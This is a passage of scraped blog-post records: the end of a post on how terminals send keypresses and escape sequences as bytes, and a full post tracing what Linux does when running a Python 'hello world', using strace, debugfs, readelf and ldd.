explicitly by the server process to display it. \n The newline: when I press enter, it sends a  \\r  (carriage return) symbol and not a  \\n  (newline) \n Escape sequences:  \\x1b  is the ASCII escape character, so  \\x1b[?2004h  is\ntelling the terminal to display something or other. I think this is a colour\nsequence but I’m not sure. We’ll talk a little more about escape sequences later. \n \n\n Okay, now let’s do something slightly more complicated. \n\n example:  Ctrl+C \n\n Next, let’s see what happens when we interrupt a process with  Ctrl+C . Here’s what I see in my terminal: \n\n bork@kiwi:/play$ cat\n^C\nbork@kiwi:/play$\n \n\n And here’s what the client sends and receives. \n\n sent: \"c\"\nrecv: \"c\"\nsent: \"a\"\nrecv: \"a\"\nsent: \"t\"\nrecv: \"t\"\nsent: \"\\r\"\nrecv: \"\\r\\n\\x1b[?2004l\\r\"\nsent: \"\\x03\"\nrecv: \"^C\"\nrecv: \"\\r\\n\"\nrecv: \"\\x1b[?2004h\"\nrecv: \"bork@kiwi:/play$ \"\n \n\n When I press  Ctrl+C , the client sends  \\x03 . If I look up an ASCII table,\n \\x03  is “End of Text”, which seems reasonable. I thought this was really cool\nbecause I’ve always been a bit confused about how Ctrl+C works – it’s good to\nknow that it’s just sending an  \\x03  character. \n\n I believe the reason  cat  gets interrupted when we press  Ctrl+C  is that the\nLinux kernel on the server side receives this  \\x03  character, recognizes that\nit means “interrupt”, and then sends a  SIGINT  to the process that owns the\npseudoterminal’s process group. So it’s handled in the kernel and not in\nuserspace. \n\n example:  Ctrl+D \n\n Let’s try the exact same thing, except with  Ctrl+D . Here’s what I see in my terminal: \n\n bork@kiwi:/play$ cat\nbork@kiwi:/play$\n \n\n And here’s what gets sent and received: \n\n sent: \"c\"\nrecv: \"c\"\nsent: \"a\"\nrecv: \"a\"\nsent: \"t\"\nrecv: \"t\"\nsent: \"\\r\"\nrecv: \"\\r\\n\\x1b[?2004l\\r\"\nsent: \"\\x04\"\nrecv: \"\\x1b[?2004h\"\nrecv: \"bork@kiwi:/play$ \"\n \n\n It’s very similar to  Ctrl+C , except that  \\x04  gets sent instead of  \\x03 .\nCool!  \\x04  corresponds to ASCII “End of Transmission”. \n\n what about Ctrl + another letter? \n\n Next I got curious about – if I send  Ctrl+e , what byte gets sent? \n\n It turns out that it’s literally just the number of that letter in the alphabet, like this: \n\n \n Ctrl+a  => 1 \n Ctrl+b  => 2 \n Ctrl+c  => 3 \n Ctrl+d  => 4 \n … \n Ctrl+z  => 26 \n \n\n Also,  Ctrl+Shift+b  does the exact same thing as  Ctrl+b  (it writes  0x2 ). \n\n What about other keys on the keyboard? Here’s what they map to: \n\n \n Tab -> 0x9 (same as Ctrl+I, since I is the 9th letter) \n Escape ->  \\x1b \n Backspace ->  \\x7f \n Home ->  \\x1b[H \n End:  \\x1b[F \n Print Screen:  \\x1b\\x5b\\x31\\x3b\\x35\\x41 \n Insert:  \\x1b\\x5b\\x32\\x7e \n Delete ->  \\x1b\\x5b\\x33\\x7e \n My  Meta  key does nothing at all \n \n\n What about Alt? From my experimenting (and some Googling), it seems like  Alt \nis literally the same as “Escape”, except that pressing  Alt  by itself doesn’t\nsend any characters to the terminal and pressing  Escape  by itself does. So: \n\n \n alt + d =>  \\x1bd  (and the same for every other letter) \n alt + shift + d =>  \\x1bD  (and the same for every other letter) \n etcetera \n \n\n Let’s look at one more example! \n\n example:  nano \n\n Here’s what gets sent and received when I run the text editor  nano : \n\n recv: \"\\r\\x1b[Kbork@kiwi:/play$ \"\nsent: \"n\" [[]byte{0x6e}]\nrecv: \"n\"\nsent: \"a\" [[]byte{0x61}]\nrecv: \"a\"\nsent: \"n\" [[]byte{0x6e}]\nrecv: \"n\"\nsent: \"o\" [[]byte{0x6f}]\nrecv: \"o\"\nsent: \"\\r\" [[]byte{0xd}]\nrecv: \"\\r\\n\\x1b[?2004l\\r\"\nrecv: \"\\x1b[?2004h\"\nrecv: \"\\x1b[?1049h\\x1b[22;0;0t\\x1b[1;16r\\x1b(B\\x1b[m\\x1b[4l\\x1b[?7h\\x1b[39;49m\\x1b[?1h\\x1b=\\x1b[?1h\\x1b=\\x1b[?25l\"\nrecv: \"\\x1b[39;49m\\x1b(B\\x1b[m\\x1b[H\\x1b[2J\"\nrecv: \"\\x1b(B\\x1b[0;7m  GNU nano 6.2 \\x1b[44bNew Buffer \\x1b[53b \\x1b[1;123H\\x1b(B\\x1b[m\\x1b[14;38H\\x1b(B\\x1b[0;7m[ Welcome to nano.  For basic help, type Ctrl+G. ]\\x1b(B\\x1b[m\\r\\x1b[15d\\x1b(B\\x1b[0;7m^G\\x1b(B\\x1b[m Help\\x1b[15;16H\\x1b(B\\x1b[0;7m^O\\x1b(B\\x1b[m Write Out   \\x1b(B\\x1b[0;7m^W\\x1b(B\\x1b[m Where Is    \\x1b(B\\x1b[0;7m^K\\x1b(B\\x1b[m Cut\\x1b[15;61H\"\n \n\n You can see some text from the UI in there like “GNU nano 6.2”, and these\n \\x1b[27m  things are escape sequences. Let’s talk about escape sequences a bit! \n\n ANSI escape sequences \n\n These  \\x1b[  things above that  nano  is sending the client are called “escape sequences” or “escape codes”.\nThis is because they all start with  \\x1b , the “escape” character. .  They change the\ncursor’s position, make text bold or underlined, change colours, etc.  Wikipedia has some history  if you’re interested. \n\n As a simple example: if you run \n\n echo -e '\\e[0;31mhi\\e[0m there'\n \n\n in your terminal, it’ll print out “hi there” where “hi” is in red and “there”\nis in black.  This page  has some nice\nexamples of escape codes for colors and formatting. \n\n I think there are a few different standards for escape codes, but my\nunderstanding is that the most common set of escape codes that people use on\nUnix come from the VT100 (that old terminal in the picture at the top of the\nblog post), and hasn’t really changed much in the last 40 years. \n\n Escape codes are why your terminal can get messed up if you  cat  a bunch of binary to\nyour screen – usually you’ll end up accidentally printing a bunch of random\nescape codes which will mess up your terminal – there’s bound to be a  0x1b \nbyte in there somewhere if you  cat  enough binary to your terminal. \n\n can you type in escape sequences manually? \n\n A few sections back, we talked about how the  Home  key maps to  \\x1b[H . Those 3 bytes are  Escape + [ + H  (because Escape is\n \\x1b ). \n\n And if I manually type Escape, then [, then H in the\n xterm.js  terminal, I end up at the beginning of the line, exactly the same as if I’d pressed  Home . \n\n I noticed that this didn’t work in  fish  on my computer though – if I typed\n Escape  and then  [ , it just printed out  [  instead of letting me continue the\nescape sequence. I asked my friend Jesse who has written  a bunch of Rust\nterminal code  about this and Jesse told me\nthat a lot of programs implement a  timeout  for escape codes – if you don’t\npress another key after some minimum amount of time, it’ll decide that it’s\nactually not an escape code anymore. \n\n Apparently this is configurable in fish with  fish_escape_delay_ms , so I ran\n set fish_escape_delay_ms 1000  and then I was able to type in escape codes by\nhand. Cool! \n\n terminal encoding is kind of weird \n\n I want to pause here for a minute here and say that the way the keys you get\npressed get mapped to bytes is pretty weird. Like, if we were designing\nthe way keys are encoded from scratch today, we would probably not set it up so\nthat: \n\n \n Ctrl + a  does the exact same thing as  Ctrl + Shift + a \n Alt  is the same as  Escape \n control sequences (like colours / moving the cursor around) use the same byte\nas the  Escape  key, so that you need to rely on timing to determine if it\nwas a control sequence of the user just meant to press  Escape \n \n\n But all of this was designed in the 70s or 80s or something and then needed\nto stay the same forever for backwards compatibility, so that’s what we get :) \n\n changing window size \n\n Not everything you can do in a terminal happens via sending bytes back and\nforth. For example, when the terminal gets resized, we have to tell Linux that the window size has\nchanged in a different way. \n\n Here’s what the Go code in\n goterm \nto do that looks like: \n\n syscall.Syscall(\n    syscall.SYS_IOCTL,\n    tty.Fd(),\n    syscall.TIOCSWINSZ,\n    uintptr(unsafe.Pointer(&resizeMessage)),\n)\n \n\n This is using the  ioctl  system call. My understanding of  ioctl  is that it’s\na system call for a bunch of random stuff that isn’t covered by other system\ncalls, generally related to IO I guess. \n\n syscall.TIOCSWINSZ  is an integer constant which which tells  ioctl  which\nparticular thing we want it to to in this case (change the window size of a\nterminal). \n\n this is also how xterm works \n\n In this post we’ve been talking about remote terminals, where the client and\nthe server are on different computers. But actually if you use a terminal\nemulator like  xterm , all of this works the exact same way, it’s just harder\nto notice because the bytes aren’t being sent over a network connection. \n\n that’s all for now! \n\n There’s definitely a lot more to know about terminals (we could talk more about\ncolours, or raw vs cooked mode, or unicode support, or the Linux pseudoterminal\ninterface) but I’ll stop here because it’s 10pm, this is getting kind of long,\nand I think my brain cannot handle more new information about terminals today. \n\n \nThanks to  Jesse Luehrs  for answering a billion of my questions about terminals, all the mistakes are mine :)\n \n\n"},
{"url": "https://jvns.ca/blog/2023/08/03/behind--hello-world/", "title": "Behind \"Hello World\" on Linux", "content": "\n     \n\n Today I was thinking about – what happens when you run a simple “Hello World”\nPython program on Linux, like this one? \n\n print(\"hello world\")\n \n\n Here’s what it looks like at the command line: \n\n $ python3 hello.py\nhello world\n \n\n But behind the scenes, there’s a lot more going on. I’ll\ndescribe some of what happens, and (much much more importantly!) explain some tools you can use to\nsee what’s going on behind the scenes yourself. We’ll use  readelf ,  strace ,\n ldd ,  debugfs ,  /proc ,  ltrace ,  dd , and  stat . I won’t talk about the Python-specific parts at all – just what happens when you run any dynamically linked executable. \n\n Here’s a table of contents: \n\n \n parse “python3 hello.py” \n figure out the full path to python3 \n stat, under the hood \n time to fork \n the shell calls execve \n get the binary’s contents \n find the interpreter \n dynamic linking \n go to _start \n write a string \n \n\n before  execve \n\n Before we even start the Python interpreter, there are a lot of things that\nhave to happen. What executable are we even running? Where is it? \n\n 1: The shell parses the string  python3 hello.py  into a command to run and a list of arguments:  python3 , and  ['hello.py'] \n\n A bunch of things like glob expansion could happen here. For example if you run  python3 *.py , the shell will expand that into  python3 hello.py \n\n 2: The shell figures out the full path to  python3 \n\n Now we know we need to run  python3 . But what’s the full path to that binary? The way this works is that there’s a special environment variable named  PATH . \n\n See for yourself : Run  echo $PATH  in your shell. For me it looks like this. \n\n $ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n \n\n When you run a command, the shell will search every directory in that list (in order) to try to find a match. \n\n In  fish  (my shell), you can see the  path resolution logic here .\nIt uses the  stat  system call to check if files exist. \n\n See for yourself : Run  strace -e stat , and then run a command like  python3 . You should see output like this: \n\n stat(\"/usr/local/sbin/python3\", 0x7ffcdd871f40) = -1 ENOENT (No such file or directory)\nstat(\"/usr/local/bin/python3\", 0x7ffcdd871f40) = -1 ENOENT (No such file or directory)\nstat(\"/usr/sbin/python3\", 0x7ffcdd871f40) = -1 ENOENT (No such file or directory)\nstat(\"/usr/bin/python3\", {st_mode=S_IFREG|0755, st_size=5479736, ...}) = 0\n \n\n You can see that it finds the binary at  /usr/bin/python3  and stops: it\ndoesn’t continue searching  /sbin  or  /bin . \n\n (if this doesn’t work for you, instead try  strace -o out bash , and then  grep\nstat out . One reader mentioned that their version of libc uses a different\nsystem call instead of  stat ) \n\n 2.1: A note on  execvp \n\n If you want to run the same PATH searching logic as the shell does without\nreimplementing it yourself, you can use the libc function  execvp  (or one of\nthe other  exec*  functions with   p  in the name). \n\n 3:  stat , under the hood \n\n Now you might be wondering – Julia, what is  stat  doing? Well, when your OS opens a file, it’s split into 2 steps. \n\n \n It maps the  filename  to an  inode , which contains metadata about the file \n It uses the  inode  to get the file’s contents \n \n\n The  stat  system call just returns the contents of the file’s inodes – it\ndoesn’t read the contents at all. The advantage of this is that it’s a lot\nfaster. Let’s go on a short adventure into inodes. ( this great post “A disk is a bunch of bits” by Dmitry Mazin  has more details) \n\n $ stat /usr/bin/python3\n  File: /usr/bin/python3 -> python3.9\n  Size: 9         \tBlocks: 0          IO Block: 4096   symbolic link\nDevice: fe01h/65025d\tInode: 6206        Links: 1\nAccess: (0777/lrwxrwxrwx)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2023-08-03 14:17:28.890364214 +0000\nModify: 2021-04-05 12:00:48.000000000 +0000\nChange: 2021-06-22 04:22:50.936969560 +0000\n Birth: 2021-06-22 04:22:50.924969237 +0000\n \n\n See for yourself : Let’s go see where exactly that inode is on our hard drive. \n\n First, we have to find our hard drive’s device name \n\n $ df\n...\ntmpfs             100016      604     99412   1% /run\n/dev/vda1       25630792 14488736  10062712  60% /\n...\n \n\n Looks like it’s  /dev/vda1 . Next, let’s find out where the inode for  /usr/bin/python3  is on our hard drive: \n\n $ sudo debugfs /dev/vda1\ndebugfs 1.46.2 (28-Feb-2021)\ndebugfs:  imap /usr/bin/python3\nInode 6206 is part of block group 0\n\tlocated at block 658, offset 0x0d00\n \n\n I have no idea how  debugfs  is figuring out the location of the inode for that filename, but we’re going to leave that alone. \n\n Now, we need to calculate how many bytes into our hard drive “block 658, offset 0x0d00” is on the big array of bytes that is your hard drive. Each block is 4096 bytes, so we need to go  4096 * 658 + 0x0d00  bytes. A calculator tells me that’s  2698496 \n\n $ sudo dd if=/dev/vda1 bs=1 skip=2698496 count=256 2>/dev/null | hexdump -C\n00000000  ff a1 00 00 09 00 00 00  f8 b6 cb 64 9a 65 d1 60  |...........d.e.`|\n00000010  f0 fb 6a 60 00 00 00 00  00 00 01 00 00 00 00 00  |..j`............|\n00000020  00 00 00 00 01 00 00 00  70 79 74 68 6f 6e 33 2e  |........python3.|\n00000030  39 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |9...............|\n00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000060  00 00 00 00 12 4a 95 8c  00 00 00 00 00 00 00 00  |.....J..........|\n00000070  00 00 00 00 00 00 00 00  00 00 00 00 2d cb 00 00  |............-...|\n00000080  20 00 bd e7 60 15 64 df  00 00 00 00 d8 84 47 d4  | ...`.d.......G.|\n00000090  9a 65 d1 60 54 a4 87 dc  00 00 00 00 00 00 00 00  |.e.`T...........|\n000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n \n\n Neat! There’s our inode! You can see it says  python3  in it, which is a really\ngood sign. We’re not going to go through all of this, but the  ext4 inode struct from the Linux kernel \nsays that the first 16 bits are the “mode”, or permissions. So let’s work that out how  ffa1  corresponds to file permissions. \n\n \n The bytes  ffa1  correspond to the number  0xa1ff , or 41471 (because x86 is little endian) \n 41471 in octal is  0120777 \n This is a bit weird – that file’s permissions could definitely be  777 , but what\nare the first 3 digits? I’m not used to seeing those! You can find out what\nthe  012  means in  man inode  (scroll down to “The file type and mode”).\nThere’s a little table that says  012  means “symbolic link”. \n \n\n Let’s list the file and see if it is in fact a symbolic link with permissions  777 : \n\n $ ls -l /usr/bin/python3\nlrwxrwxrwx 1 root root 9 Apr  5  2021 /usr/bin/python3 -> python3.9\n \n\n It is! Hooray, we decoded it correctly. \n\n 4: Time to fork \n\n We’re still not ready to start  python3 . First, the shell needs to create a\nnew child process to run. The way new processes start on Unix is a little weird\n– first the process clones itself, and then runs  execve , which replaces the\ncloned process with a new process. \n\n * See for yourself:  Run  strace -e clone bash , then run  python3 . You should see something like this: \n\n clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f03788f1a10) = 3708100\n \n\n 3708100  is the PID of the new process, which is a child of the shell process. \n\n Some more tools to look at what’s going on with processes: \n\n \n pstree  will show you a tree of all the processes on your system \n cat /proc/PID/stat  shows you some information about the process. The contents of that file are documented in  man proc . For example the 4th field is the parent PID. \n \n\n 4.1: What the new process inherits. \n\n The new process (which will become  python3 ) has inherited a bunch of from the shell. For example, it’s inherited: \n\n \n environment variables : you can look at them with  cat /proc/PID/environ | tr '\\0' '\\n' \n file descriptors  for stdout and stderr: look at them with  ls -l /proc/PID/fd \n a  working directory  (whatever the current directory is) \n namespaces and cgroups  (if it’s in a container) \n the  user  and  group  that’s running it \n probably more things I’m not thinking of right now \n \n\n 5: The shell calls  execve \n\n Now we’re ready to start the Python interpreter! \n\n See for yourself : Run  strace -f -e execve bash , then run  python3 . The  -f  is important because we want to follow any forked child subprocesses. You should see something like this: \n\n [pid 3708381] execve(\"/usr/bin/python3\", [\"python3\"], 0x560397748300 /* 21 vars */) = 0\n \n\n The first argument is the binary, and the second argument is the list of\ncommand line arguments. The command line arguments get placed in a special\nlocation in the program’s memory so that it can access them when it runs. \n\n Now, what’s going on inside  execve ? \n\n 6: get the binary’s contents \n\n The first thing that has to happen is that we need to open the  python3 \nbinary file and read its contents. So far we’ve only used the  stat  system call to access its metadata,\nbut now we need its contents. \n\n Let’s look at the output of  stat  again: \n\n $ stat /usr/bin/python3\n  File: /usr/bin/python3 -> python3.9\n  Size: 9         \tBlocks: 0          IO Block: 4096   symbolic link\nDevice: fe01h/65025d\tInode: 6206        Links: 1\n...\n \n\n This takes up 0 blocks of space on the disk. This is because the contents of\nthe symbolic link ( python3.9 ) are actually in the inode itself: you can see\nthem here (from the binary contents of the inode above, it’s split across 2\nlines in the hexdump output): \n\n 00000020  00 00 00 00 01 00 00 00  70 79 74 68 6f 6e 33 2e  |........python3.|\n00000030  39 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |9...............|\n \n\n So we’ll need to open  /usr/bin/python3.9  instead. All of this is happening\ninside the kernel so you won’t see it another system call for that. \n\n Every file is made up of a bunch of  blocks  on the hard drive. I think each of these\nblocks on my system is 4096 bytes, so the minimum size of a file is 4096 bytes\n– even if the file is only 5 bytes, it still takes up 4KB on disk. \n\n See for yourself : We can find the block numbers using  debugfs  like this: (again, I got these instructions from  dmitry mazin’s “A disk is a bunch of bits” post ) \n\n $ debugfs /dev/vda1\ndebugfs:  blocks /usr/bin/python3.9\n145408 145409 145410 145411 145412 145413 145414 145415 145416 145417 145418 145419 145420 145421 145422 145423 145424 145425 145426 145427 145428 145429 145430 145431 145432 145433 145434 145435 145436 145437\n \n\n Now we can use  dd  to read the first block of the file. We’ll set the block size to 4096 bytes, skip  145408  blocks, and read 1 block. \n\n $ dd if=/dev/vda1 bs=4096 skip=145408 count=1 2>/dev/null | hexdump -C | head\n00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|\n00000010  02 00 3e 00 01 00 00 00  c0 a5 5e 00 00 00 00 00  |..>.......^.....|\n00000020  40 00 00 00 00 00 00 00  b8 95 53 00 00 00 00 00  |@.........S.....|\n00000030  00 00 00 00 40 00 38 00  0b 00 40 00 1e 00 1d 00  |....@.8...@.....|\n00000040  06 00 00 00 04 00 00 00  40 00 00 00 00 00 00 00  |........@.......|\n00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|\n00000060  68 02 00 00 00 00 00 00  68 02 00 00 00 00 00 00  |h.......h.......|\n00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|\n00000080  a8 02 00 00 00 00 00 00  a8 02 40 00 00 00 00 00  |..........@.....|\n00000090  a8 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |..@.............|\n \n\n You can see that we get the exact same output as if we read the file with  cat , like this: \n\n $ cat /usr/bin/python3.9 | hexdump -C | head\n00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|\n00000010  02 00 3e 00 01 00 00 00  c0 a5 5e 00 00 00 00 00  |..>.......^.....|\n00000020  40 00 00 00 00 00 00 00  b8 95 53 00 00 00 00 00  |@.........S.....|\n00000030  00 00 00 00 40 00 38 00  0b 00 40 00 1e 00 1d 00  |....@.8...@.....|\n00000040  06 00 00 00 04 00 00 00  40 00 00 00 00 00 00 00  |........@.......|\n00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|\n00000060  68 02 00 00 00 00 00 00  68 02 00 00 00 00 00 00  |h.......h.......|\n00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|\n00000080  a8 02 00 00 00 00 00 00  a8 02 40 00 00 00 00 00  |..........@.....|\n00000090  a8 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |..@.............|\n \n\n an aside on magic numbers \n\n This file starts with  ELF , which is a “magic number”, or a byte sequence that\ntells us that this is an ELF file. ELF is the binary file format on Linux. \n\n Different file formats have different magic numbers, for example the magic\nnumber for gzip is  1f8b . The magic number at the beginning is how  file blah.gz  knows that it’s a gzip file. \n\n I think  file  has a variety of heuristics for figuring out the file type of a\nfile, not just magic numbers, but the magic number is an important one. \n\n 7: find the interpreter \n\n Let’s parse the ELF file to see what’s in there. \n\n See for yourself:  Run  readelf -a /usr/bin/python3.9 . Here’s what I get (though I’ve redacted a LOT of stuff): \n\n $ readelf -a /usr/bin/python3.9\nELF Header:\n    Class:                             ELF64\n    Machine:                           Advanced Micro Devices X86-64\n...\n->  Entry point address:               0x5ea5c0\n...\nProgram Headers:\n  Type           Offset             VirtAddr           PhysAddr\n  INTERP         0x00000000000002a8 0x00000000004002a8 0x00000000004002a8\n                 0x000000000000001c 0x000000000000001c  R      0x1\n->      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]\n        ...\n->        1238: 00000000005ea5c0    43 FUNC    GLOBAL DEFAULT   13 _start\n \n\n Here’s what I understand of what’s going on here: \n\n \n it’s telling the kernel to run  /lib64/ld-linux-x86-64.so.2  to start this program. This is called the  dynamic linker  and we’ll talk about it next \n it’s specifying an entry point (at  0x5ea5c0 , which is where this program’s code starts) \n \n\n Now let’s talk about the dynamic linker. \n\n 8: dynamic linking \n\n Okay! We’ve read the bytes from disk and we’ve started this “interpreter” thing. What next? Well, if you run  strace -o out.strace python3 , you’ll see a bunch of stuff like this right after the  execve  system call: \n\n execve(\"/usr/bin/python3\", [\"python3\"], 0x560af13472f0 /* 21 vars */) = 0\nbrk(NULL)                       = 0xfcc000\naccess(\"/etc/ld.so.preload\", R_OK) = -1 ENOENT (No such file or directory)\nopenat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3\nfstat(3, {st_mode=S_IFREG|0644, st_size=32091, ...}) = 0\nmmap(NULL, 32091, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f718a1e3000\nclose(3)                        = 0\nopenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libpthread.so.0\", O_RDONLY|O_CLOEXEC) = 3\nread(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0>\\0\\1\\0\\0\\0 l\\0\\0\\0\\0\\0\\0\"..., 832) = 832\nfstat(3, {st_mode=S_IFREG|0755, st_size=149520, ...}) = 0\nmmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f718a1e1000\n...\nclose(3)                        = 0\nopenat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libdl.so.2\", O_RDONLY|O_CLOEXEC) = 3\n \n\n This all looks a bit intimidating at first, but the part I want you to pay\nattention to is  openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libpthread.so.0\" .\nThis is opening a C threading library called  pthread  that the Python\ninterpreter needs to run. \n\n See for yourself:  If you want to know which libraries a binary needs to load at runtime, you can use  ldd . Here’s what that looks like for me: \n\n $ ldd /usr/bin/python3.9\n\tlinux-vdso.so.1 (0x00007ffc2aad7000)\n\tlibpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f2fd6554000)\n\tlibdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f2fd654e000)\n\tlibutil.so.1 => /lib/x86_64-linux-gnu/libutil.so.1 (0x00007f2fd6549000)\n\tlibm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f2fd6405000)\n\tlibexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f2fd63d6000)\n\tlibz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007f2fd63b9000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2fd61e3000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007f2fd6580000)\n \n\n You can see that the first library listed is  /lib/x86_64-linux-gnu/libpthread.so.0 , which is why it was loaded first. \n\n on LD_LIBRARY_PATH \n\n I’m honestly still a little confused about dynamic linking. Some things I know: \n\n \n Dynamic linking happens in userspace and the dynamic linker on my system is at  /lib64/ld-linux-x86-64.so.2 . If you’re missing the dynamic linker, you can end up with weird bugs like this  weird “file not found” error \n The dynamic linker uses the  LD_LIBRARY_PATH  environment variable to find libraries \n The dynamic linker will also use the  LD_PRELOAD  environment to override any dynamically linked function you want (you can use this for  fun hacks , or to replace your default memory allocator with an alternative one like jemalloc) \n there are some  mprotect s in the strace output which are marking the library code as read-only, for security reasons \n on Mac, it’s  DYLD_LIBRARY_PATH  instead of  LD_LIBRARY_PATH \n \n\n You might be wondering – if dynamic linking happens in userspace, why don’t we\nsee a bunch of  stat  system calls where it’s searching through\n LD_LIBRARY_PATH  for the libraries, the way we did when bash was searching the\n PATH ? \n\n That’s because  ld  has a cache in  /etc/ld.so.cache , and all of those\nlibraries have already been found in the past. You can see it opening the cache\nin the strace output –  openat(AT_FDCWD, \"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3 . \n\n There are still a bunch of system calls after dynamic linking in the  full strace output  that I\nstill don’t really understand (what’s  prlimit64  doing? where does the locale\nstuff come in? what’s  gconv-modules.cache ? what’s  rt_sigaction  doing?\nwhat’s  arch_prctl ? what’s  set_tid_address  and  set_robust_list ?). But this feels like a good start. \n\n aside: ldd is actually a simple shell script! \n\n Someone on mastodon  pointed out  that  ldd  is actually a shell script\nthat just sets the  LD_TRACE_LOADED_OBJECTS=1  environment variable and\nstarts the program. So you can do exactly the same thing like this: \n\n $ LD_TRACE_LOADED_OBJECTS=1 python3\n\tlinux-vdso.so.1 (0x00007ffe13b0a000)\n\tlibpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f01a5a47000)\n\tlibdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f01a5a41000)\n\tlibutil.so.1 => /lib/x86_64-linux-gnu/libutil.so.1 (0x00007f2fd6549000)\n\tlibm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007f2fd6405000)\n\tlibexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007f2fd63d6000)\n\tlibz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007f2fd63b9000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2fd61e3000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007f2fd6580000)\n \n\n Apparently  ld  is also a binary you can just run, so  /lib64/ld-linux-x86-64.so.2 --list /usr/bin/python3.9  also does the the same thing. \n\n on  init  and  fini \n\n Let’s talk about this line in the  strace  output: \n\n set_tid_address(0x7f58880dca10)         = 3709103\n \n\n This seems to have something to do with threading, and I think this might be\nhappening because the  pthread  library (and every other dynamically loaded)\ngets to run initialization code when it’s loaded. The code that runs when the\nlibrary is loaded is in the  init  section (or maybe also the  .ctors  section). \n\n See for yourself:  Let’s take a look at that using readelf: \n\n $ readelf -a /lib/x86_64-linux-gnu/libpthread.so.0\n...\n  [10] .rela.plt         RELA             00000000000051f0  000051f0\n       00000000000007f8  0000000000000018  AI       4    26     8\n  [11] .init             PROGBITS         0000000000006000  00006000\n       000000000000000e  0000000000000000  AX       0     0     4\n  [12] .plt              PROGBITS         0000000000006010  00006010\n       0000000000000560  0000000000000010  AX       0     0     16\n...\n \n\n This library doesn’t have a  .ctors  section, just an  .init . But what’s in\nthat  .init  section? We can use  objdump  to disassemble the code: \n\n $ objdump -d /lib/x86_64-linux-gnu/libpthread.so.0\nDisassembly of section .init:\n\n0000000000006000 <_init>:\n    6000:       48 83 ec 08             sub    $0x8,%rsp\n    6004:       e8 57 08 00 00          callq  6860 <__pthread_initialize_minimal>\n    6009:       48 83 c4 08             add    $0x8,%rsp\n    600d:       c3\n \n\n So it’s calling  __pthread_initialize_minimal .  I found the  code for that function in glibc ,\nthough I had to find an older version of glibc because it looks like in more\nrecent versions  libpthread is no longer a separate library . \n\n I’m not sure whether this  set_tid_address  system call actually comes from\n __pthread_initialize_minimal , but at least we’ve learned that libraries can\nrun code on startup through the  .init  section. \n\n Here’s a note from  man elf  on the  .init  section: \n\n $ man elf\n .init  This section holds executable instructions that contribute to the process initialization code.  When a program starts to run\n              the system arranges to execute the code in this section before calling the main program entry point.\n \n\n There’s also a  .fini  section in the ELF file that runs at the end, and\n .ctors  /  .dtors  (constructors and destructors) are other sections that\ncould exist. \n\n Okay, that’s enough about dynamic linking. \n\n 9: go to  _start \n\n After dynamic linking is done, we go to  _start  in the Python interpreter.\nThen it does all the normal Python interpreter things you’d expect. \n\n I’m not going to talk about this because here I’m interested in general\nfacts about how binaries are run on Linux, not the Python interpreter\nspecifically. \n\n 10: write a string \n\n We still need to print out “hello world” though. Under the hood, the Python  print  function calls some function from libc. But which one? Let’s find out! \n\n See for yourself : Run  ltrace -o out python3 hello.py . \n\n $ ltrace -o out python3 hello.py\n$ grep hello out\nwrite(1, \"hello world\\n\", 12) = 12\n \n\n So it looks like it’s calling  write \n\n I honestly am always a little suspicious of ltrace – unlike strace (which I\nwould trust with my life), I’m never totally sure that ltrace is actually\nreporting library calls accurately. But in this case it seems to be working. And\nif we look at the  cpython source code , it does seem to be calling  write()  in some places. So I’m willing to believe that. \n\n what’s libc? \n\n We just said that Python calls the  write  function from libc. What’s libc?\nIt’s the C standard library, and it’s responsible for a lot of basic things\nlike: \n\n \n allocating memory with  malloc \n file I/O (opening/closing/ \n executing programs (with  execvp , like we mentioned before) \n looking up DNS records with  getaddrinfo \n managing threads with  pthread \n \n\n Programs don’t  have  to use libc (on Linux, Go famously doesn’t use it and\ncalls Linux system calls directly instead), but most other programming\nlanguages I use (node, Python, Ruby, Rust) all use libc. I’m not sure about Java. \n\n You can find out if you’re using libc by running  ldd  on your binary: if you\nsee something like  libc.so.6 , 